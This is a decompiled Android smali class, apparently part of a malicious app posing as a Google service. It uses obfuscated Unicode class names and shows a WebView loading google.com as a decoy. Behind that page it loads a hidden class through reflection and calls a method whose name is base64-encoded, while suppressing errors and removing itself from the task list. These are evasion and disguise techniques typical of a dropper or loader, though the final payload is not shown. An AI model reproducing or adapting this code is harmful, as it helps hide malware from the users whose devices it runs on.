.class public Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795;
.super Landroid/app/Activity;
.source "\u02ce\u02cb\u02bf\u02d1\u3164\u02bf\u3164\u02c8\u02cb\u02bd\u1d35\u02bf\u02bf\u05d9\u02bf\u02c9\u03c6\u02be\u0559$\u42404795.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795$HelloWebViewClient;
    }
.end annotation


# instance fields
.field wb:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 15
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 2

    .line 94
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_0

    .line 95
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    .line 98
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 9

    .line 27
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const p1, 0x7f07000a

    .line 30
    :try_start_0
    invoke-virtual {p0, p1}, Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795;->setContentView(I)V

    const p1, 0x7f050046

    .line 31
    invoke-virtual {p0, p1}, Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/webkit/WebView;

    iput-object p1, p0, Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795;->wb:Landroid/webkit/WebView;

    .line 32
    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 33
    iget-object p1, p0, Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    .line 34
    iget-object p1, p0, Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 35
    iget-object p1, p0, Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const/4 v1, 0x0

    invoke-virtual {p1, v1}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    .line 36
    iget-object p1, p0, Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    sget-object v2, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;

    invoke-virtual {p1, v2}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V

    .line 38
    iget-object p1, p0, Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795;->wb:Landroid/webkit/WebView;

    new-instance v2, Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795$HelloWebViewClient;

    const/4 v3, 0x0

    invoke-direct {v2, p0, v3}, Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795$HelloWebViewClient;-><init>(Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795;Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795$1;)V

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 39
    iget-object p1, p0, Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795;->wb:Landroid/webkit/WebView;

    const-string v2, "https://www.google.com"

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 40
    invoke-virtual {p0}, Lgoogle/service/ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    .line 45
    const-class v2, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;

    invoke-static {v2, p1}, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->sFhShxrBDUTiACGNcRtoCJ4818(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 46
    new-instance v2, Landroid/content/Intent;

    const-class v4, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;

    invoke-direct {v2, p1, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "splash.app.\u4240\u03c6\u20ab\u05d9\u2db1\u02c9\u02c8\u02cb\u03c6\u02be\ufe73$\u02c9\u3164\u1d62$\u02cb\u02bf\u02be$\u1d54\u4240\u02bf$\u05d9\u02bf\u3164$$\u1d35\u02cb4774"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_6

    .line 52
    :try_start_1
    invoke-static {v4}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v4
    :try_end_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_6

    goto :goto_0

    :catch_0
    move-exception v4

    .line 54
    :try_start_2
    invoke-virtual {v4}, Ljava/lang/ClassNotFoundException;->printStackTrace()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_6

    move-object v4, v3

    .line 60
    :goto_0
    :try_start_3
    invoke-virtual {v4}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v5
    :try_end_3
    .catch Ljava/lang/IllegalAccessException; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/lang/InstantiationException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_6

    goto :goto_2

    :catch_1
    move-exception v5

    .line 64
    :try_start_4
    invoke-virtual {v5}, Ljava/lang/InstantiationException;->printStackTrace()V

    goto :goto_1

    :catch_2
    move-exception v5

    .line 62
    invoke-virtual {v5}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    :goto_1
    move-object v5, v3

    :goto_2
    const/4 v6, 0x2

    new-array v7, v6, [Ljava/lang/Class;

    .line 68
    const-class v8, Landroid/content/Context;

    aput-object v8, v7, v1

    .line 69
    const-class v8, Landroid/content/Intent;

    aput-object v8, v7, v0

    const-string v8, "U3RhcnROZXdTY2Fu"

    .line 70
    invoke-static {v8}, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->iTMfwUrRZRqyQhfBUmxtDp4809(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_6

    .line 74
    :try_start_5
    invoke-virtual {v4, v8, v7}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3
    :try_end_5
    .catch Ljava/lang/NoSuchMethodException; {:try_start_5 .. :try_end_5} :catch_3
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_6

    goto :goto_3

    :catch_3
    move-exception v4

    .line 76
    :try_start_6
    invoke-virtual {v4}, Ljava/lang/NoSuchMethodException;->printStackTrace()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_6

    :goto_3
    :try_start_7
    new-array v4, v6, [Ljava/lang/Object;

    aput-object p1, v4, v1

    aput-object v2, v4, v0

    .line 80
    invoke-virtual {v3, v5, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_7
    .catch Ljava/lang/IllegalAccessException; {:try_start_7 .. :try_end_7} :catch_5
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_7 .. :try_end_7} :catch_4
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_6

    goto :goto_4

    :catch_4
    move-exception p1

    .line 84
    :try_start_8
    invoke-virtual {p1}, Ljava/lang/reflect/InvocationTargetException;->printStackTrace()V

    goto :goto_4

    :catch_5
    move-exception p1

    .line 82
    invoke-virtual {p1}, Ljava/lang/IllegalAccessException;->printStackTrace()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_6

    :catch_6
    :cond_0
    :goto_4
    return-void
.end method
